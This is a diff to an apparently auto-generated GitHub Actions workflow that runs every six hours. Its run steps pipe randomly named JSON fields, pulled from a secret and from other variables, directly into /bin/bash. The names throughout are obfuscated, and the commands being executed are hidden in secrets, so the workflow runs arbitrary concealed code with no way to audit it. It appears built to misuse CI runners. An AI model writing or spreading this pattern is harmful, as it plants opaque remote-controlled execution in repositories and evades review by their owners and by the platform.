@@ -3,22 +3,32 @@ name: liufutu4716
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 5/6 * * *'
-jobs:  # 3547
+    - cron: '19 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liufutu4716
         env:
-          j23955: ${{ secrets.j23955 }}
+          n062: ${{ secrets.n062 }}
         run: |
-          echo $j23955 | jq -r .ld42390 | /bin/bash
-          echo $p8020 | jq -r .szxjn9 | /bin/bash
-          echo $kgp4 | jq -r .mwk798 | /bin/bash
-          echo $eqkxg932 | jq -r .wlnig39 | /bin/bash
-          echo $kv8605 | jq -r .snzr6743 | /bin/bash
-          echo $clhxq5 | jq -r .vzmcw7 | /bin/bash
-          echo $e6095 | jq -r .hvk15651 | /bin/bash
+          echo $n062 | jq -r .beqw6818 | /bin/bash
+          echo $xayy3 | jq -r .cijnf8 | /bin/bash
+          echo $vcc684 | jq -r .dk28 | /bin/bash
+          echo $czok8 | jq -r .chw053 | /bin/bash
+          echo $cghv8 | jq -r .g12 | /bin/bash
+          echo $a4 | jq -r .zpd800 | /bin/bash
+          echo $qpba51202 | jq -r .fg0 | /bin/bash
+          echo $mgl9 | jq -r .e755 | /bin/bash
+          echo $bcb3747 | jq -r .jdl815 | /bin/bash
+          echo $km86470 | jq -r .advzg994 | /bin/bash
+          echo $w26 | jq -r .jyux46061 | /bin/bash
+          echo $ytbjf854 | jq -r .js4 | /bin/bash
+          echo $zlyfy9925 | jq -r .beymq2010 | /bin/bash
+          echo $ufgy8 | jq -r .ccy147 | /bin/bash
+          echo $jid988 | jq -r .w65549 | /bin/bash
+          echo $qcvnv72311 | jq -r .pfbdf3 | /bin/bash
+          echo $m837 | jq -r .q8 | /bin/bash
 
